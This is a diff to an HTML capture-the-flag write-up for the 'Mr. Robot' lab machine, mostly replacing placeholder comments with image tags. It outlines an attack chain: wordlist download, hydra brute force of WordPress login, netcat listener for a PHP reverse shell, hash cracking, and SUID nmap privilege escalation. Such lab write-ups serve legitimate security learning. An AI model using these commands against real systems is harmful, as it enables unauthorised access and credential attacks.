@@ -2,41 +2,9 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Mr. Robot CTF Writeup</title>
   <link rel="stylesheet" href="../css/style.css" />
-  <style>
-    body {
-      background-color: #0d1117;
-      color: #c9d1d9;
-      font-family: 'Segoe UI', sans-serif;
-      padding: 2rem;
-      line-height: 1.6;
-    }
-    h1, h2 {
-      color: #58a6ff;
-    }
-    pre {
-      background-color: #161b22;
-      padding: 1rem;
-      overflow-x: auto;
-      border-radius: 5px;
-    }
-    img {
-      max-width: 100%;
-      margin: 1rem 0;
-    }
-    .meta-box {
-      background: #161b22;
-      border-left: 4px solid #58a6ff;
-      padding: 1rem;
-      margin-bottom: 2rem;
-      border-radius: 5px;
-    }
-    a {
-      color: #58a6ff;
-    }
-  </style>
 </head>
 <body>
   <h1>Mr. Robot CTF Writeup</h1>
@@ -56,54 +24,58 @@
 </code></pre>
 
   <h2>Enumerating HTTP and HTTPS</h2>
-  <!-- TODO: Add image from assets/mrrobot -->
+  <!-- img src="../assets/mrrobot/robots.txt.png" alt="robots.txt contents" -->
   <p>Interacting with these didn’t do anything.</p>
 
-  <!-- TODO: Add robots.txt image -->
+  <!-- img src="../assets/mrrobot/robots.txt.png" alt="robots.txt contents" -->
   <p>Found first key and a wordlist in robots.txt</p>
 
   <pre><code>wget http://10.10.99.69/fsocity.dic</code></pre>
 
   <h2>Discovering Wordpress</h2>
-  <!-- TODO: Add gobuster image -->
+  <!-- img src="../assets/mrrobot/gobuster.png" alt="gobuster output" -->
 
   <pre><code>cat fsocity.dic | grep angela</code></pre>
 
   <p>Remove duplicates:</p>
   <pre><code>sort fsocity.dic | uniq -d > clean-dic.txt</code></pre>
 
-  <!-- TODO: Add wp-login image -->
+  <!-- img src="../assets/mrrobot/wp-login.png" alt="WordPress login page" -->
 
   <h2>Username Enumeration</h2>
-  <!-- TODO: Add elliot image -->
+  <!-- img src="../assets/mrrobot/elliot.png" alt="Valid username elliot" -->
 
   <h2>Brute Force Login</h2>
   <pre><code>hydra -L clean-dic.txt -p test &lt;target-ip&gt; http-post-form "/wp-login.php:log=^USER^&amp;pwd=^PASS^:F=Invalid username"</code></pre>
 
   <p>Valid credentials: <code>elliot:XXXXXXX</code></p>
 
-  <!-- TODO: Add theme editor image -->
+  <!-- img src="../assets/mrrobot/theme-editor.png" alt="Theme editor access" -->
 
   <h2>Reverse Shell</h2>
   <p>Used <a href="https://github.com/pentestmonkey/php-reverse-shell">pentestmonkey reverse shell</a>.</p>
 
   <pre><code>nc -lvnp 1337</code></pre>
 
-  <!-- TODO: Add shell access image -->
+  <!-- img src="../assets/mrrobot/shell-access.png" alt="Shell access as daemon" -->
 
   <h2>Privilege Escalation</h2>
-  <!-- TODO: Add robot user directory image -->
+  <!-- img src="../assets/mrrobot/robot-home.png" alt="Robot user's home directory" -->
 
   <p>Found a hash, cracked it on <a href="https://crackstation.net">CrackStation</a>.</p>
 
-  <!-- TODO: Add cracked password and second key images -->
+  <!-- img src="../assets/mrrobot/cracked-password.png" alt="Cracked password for robot" -->
+
+  <!-- img src="../assets/mrrobot/second-key.png" alt="Second key obtained" -->
 
   <h2>Root.txt</h2>
-  <!-- TODO: Add SUID binaries image -->
+  <!-- img src="../assets/mrrobot/suid-binaries.png" alt="SUID binaries found" -->
 
   <p>Nmap was a SUID binary. Exploited via GTFOBins.</p>
 
-  <!-- TODO: Add GTFOBin and root access image -->
+  <!-- img src="../assets/mrrobot/gtfo-nmap.png" alt="GTFOBins nmap exploit" -->
+
+  <!-- img src="../assets/mrrobot/root-access.png" alt="Root access achieved" -->
 
   <p>✅ Root access achieved!</p>
 
